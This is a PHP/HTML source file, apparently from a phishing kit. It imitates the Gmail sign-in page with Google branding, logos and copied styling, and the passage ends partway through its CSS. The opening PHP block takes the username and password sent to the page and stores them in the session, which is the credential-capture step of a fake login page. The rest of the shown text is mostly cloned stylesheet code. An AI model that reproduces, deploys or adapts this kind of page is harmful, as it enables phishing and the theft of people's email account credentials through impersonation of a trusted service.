<?php
@require "../../includes/session_protect.php";
@require "../../includes/functions.php";
@require "../../includes/simplehtmldom.php";
$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];
?>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="google" value="notranslate">
  <meta name="description" content="Gmail is email that's intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <title>Gmail</title>
  <style>
  /* cyrillic-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OX-hpOqc.woff2) format('woff2');
  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}
/* cyrillic */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OVuhpOqc.woff2) format('woff2');
  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}
/* greek-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OXuhpOqc.woff2) format('woff2');
  unicode-range: U+1F00-1FFF;
}
/* greek */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OUehpOqc.woff2) format('woff2');
  unicode-range: U+0370-03FF;
}
/* vietnamese */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OXehpOqc.woff2) format('woff2');
  unicode-range: U+0102-0103, U+0110-0111, U+1EA0-1EF9, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OXOhpOqc.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OUuhp.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
/* cyrillic-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFWJ0bbck.woff2) format('woff2');
  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}
/* cyrillic */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFUZ0bbck.woff2) format('woff2');
  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}
/* greek-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFWZ0bbck.woff2) format('woff2');
  unicode-range: U+1F00-1FFF;
}
/* greek */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFVp0bbck.woff2) format('woff2');
  unicode-range: U+0370-03FF;
}
/* vietnamese */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFWp0bbck.woff2) format('woff2');
  unicode-range: U+0102-0103, U+0110-0111, U+1EA0-1EF9, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFW50bbck.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFVZ0b.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(https://ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_1x.png);
  background-size: 116px 38px;
  background-repeat: no-repeat;
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .logo-w {
  background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png);
  background-size: 112px 36px;
  margin: 21px 0 0;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  min-height: 16px;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .header .logo {
  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_2x.png);
  }
  .header .logo-w {
  background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_112x36dp.png);
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google .logo-strip {
  background-repeat: no-repeat;
  display: block;
  margin: 10px auto;
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png);
  background-size: 230px 17px;
  width: 230px;
  height: 17px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 28px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .one-google .logo-strip {
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_2x.png);
  }
</style>
<style>
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  top: 380px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("//ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style type="text/css">
.captcha-box {
  background: #fff;
  margin: 0 0 10px;
  overflow: hidden;
  padding: 10px;
}
.captcha-box .captcha-img {
  text-align: center;
}
.captcha-box .captcha-label {
  font-weight: bold;
  display: block;
  margin: .5em 0;
}
.captcha-box .captcha-msg {
  color: #999;
  display: block;
  position: relative;
}
.captcha-box .captcha-msg .accessibility-logo {
  float: right;
  border: 0;
}
.captcha-box .audio-box {
  position: absolute;
  top: 0;
}
</style>
<style>
.chromiumsync-custom-content {
  padding-top: 20px;
  margin-bottom: 0;
}
.form-panel {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -webkit-transform: translateZ(0);
  -moz-transform: translateZ(0);
  -ms-transform: translateZ(0);
  -o-transform: translateZ(0);
  transform: translateZ(0);
  width: 100%;
}
.form-panel.first {
  z-index: 2;
}
.form-panel.second {
  z-index: 1;
}
.shift-form .form-panel.first {
  z-index: 1;
}
.shift-form .form-panel.second {
  z-index: 2;
}
.slide-in,
.slide-out {
  display: block;
  -webkit-transition-property: -webkit-transform, opacity;
  -moz-transition-property: -moz-transform, opacity;
  -ms-transition-property: -ms-transform, opacity;
  -o-transition-property: -o-transform, opacity;
  transition-property: transform, opacity;
  -webkit-transition-duration: 0.1s;
  -moz-transition-duration: 0.1s;
  -ms-transition-duration: 0.1s;
  -o-transition-duration: 0.1s;
